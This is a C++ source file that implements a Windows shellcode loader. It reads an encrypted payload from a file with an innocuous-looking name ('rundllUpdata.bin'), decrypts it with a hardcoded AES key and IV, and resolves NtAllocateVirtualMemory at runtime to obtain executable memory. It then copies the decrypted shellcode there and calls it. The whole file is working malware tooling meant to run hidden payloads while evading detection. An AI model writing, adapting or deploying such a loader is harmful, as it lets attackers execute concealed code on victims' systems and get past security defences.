#include <openssl/evp.h>
#include <iostream>
#include <fstream>
#include <windows.h>
#include <winternl.h>
#include <vector>

#define AES_BLOCK_SIZE 16 
#define OUTPUT_FILE "rundllUpdata.bin"


// AES 密钥
unsigned char AES_KEY[16] = {
    0x2F, 0x8A, 0x15, 0xC4, 0x67, 0x9B, 0x3E, 0xD2,
    0x54, 0x8F, 0xA1, 0x7C, 0xE9, 0x05, 0x6D, 0xB8
};



// AES IV
unsigned char AES_IV[16] = {
    0x91, 0x7E, 0x4A, 0x23, 0xF6, 0x5C, 0x8D, 0x1B,
    0x37, 0xE2, 0x94, 0x08, 0xAF, 0x6B, 0xC5, 0x40
};



std::vector<unsigned char> LoadEncryptedShellcode(const std::string& filename) {
    std::ifstream file(filename, std::ios::binary);
    return std::vector<unsigned char>((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
}

std::vector<unsigned char> AESDecrypt(const std::vector<unsigned char>& encryptedShellcode) {
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        std::cerr << "EVP_CIPHER_CTX 初始化失败！" << std::endl;
        return {};
    }

    size_t len = 0, decrypted_len = 0;

    if (EVP_DecryptInit_ex(ctx, EVP_aes_128_cbc(), NULL, AES_KEY, AES_IV) != 1) {
        std::cerr << "AES 解密初始化失败！" << std::endl;
        return {};
    }

    std::vector<unsigned char> decryptedShellcode(encryptedShellcode.size() + AES_BLOCK_SIZE);

    if (EVP_DecryptUpdate(ctx, decryptedShellcode.data(), (int*)&len, encryptedShellcode.data(), encryptedShellcode.size()) != 1) {
        std::cerr << "AES 解密失败！" << std::endl;
        return {};
    }
    decrypted_len += len;

    if (EVP_DecryptFinal_ex(ctx, decryptedShellcode.data() + decrypted_len, (int*)&len) != 1) {
        std::cerr << "AES Final 解密失败！" << std::endl;
        return {};
    }
    decrypted_len += len;

    EVP_CIPHER_CTX_free(ctx);

    decryptedShellcode.resize(decrypted_len);
    return decryptedShellcode;
}

typedef NTSTATUS(WINAPI* pNtAllocMem)(
    HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);

void RunTask(const std::vector<unsigned char>& payload) {
    void* mem_region = nullptr;
    SIZE_T mem_size = payload.size();

    pNtAllocMem FnAllocMem = (pNtAllocMem)GetProcAddress(
        GetModuleHandle(L"ntdll.dll"), "NtAllocateVirtualMemory");

    if (FnAllocMem) {
        NTSTATUS status = FnAllocMem(
            GetCurrentProcess(),
            &mem_region,
            0,
            &mem_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );

        if (status == 0) {
            std::cout << "Memory allocated at: " << mem_region << std::endl;
            memcpy(mem_region, payload.data(), payload.size());
            ((void(*)())mem_region)();  // **执行 payload** 9
        }
        else {
            std::cerr << "Memory allocation failed, Status Code: " << std::hex << status << std::endl;
        }
    }
}


//=================================================================================
//=================================================================================
//=================================================================================
//=================================================================================
//=================================================================================
//=================================================================================
//=================================================================================
//=================================================================================
//=================================================================================
//=================================================================================
//=================================================================================
//=================================================================================
//=================================================================================
//=================================================================================
//=================================================================================
//=================================================================================
//=================================================================================
//=================================================================================
//=================================================================================
//=================================================================================
//=================================================================================
//=================================================================================
//=================================================================================
//=================================================================================
//=================================================================================
//=================================================================================
//=================================================================================
//=================================================================================
//=================================================================================
//=================================================================================
//=================================================================================
//=================================================================================
//=================================================================================
//=================================================================================
//=================================================================================
//=================================================================================


int main() {
    std::vector<unsigned char> encryptedShellcode = LoadEncryptedShellcode(OUTPUT_FILE);

    if (encryptedShellcode.empty()) {
        std::cerr << "无法加载 shellcode.bin\n";
        return -1;
    }

    std::vector<unsigned char> shellcode = AESDecrypt(encryptedShellcode);

    if (shellcode.empty()) {
        std::cerr << "解密失败！请检查密钥和 IV 是否正确。\n";
        return -1;
    }

    std::cout << "解密完成，Shellcode 长度：" << shellcode.size() << " 字节\n";

    if (shellcode.empty()) {
        std::cerr << "Shellcode 为空，无法执行！" << std::endl;
        return -1;
    }

    std::cout << "Shellcode 长度：" << shellcode.size() << " 字节，开始执行..." << std::endl;
    RunTask(shellcode);

    return 0;
}
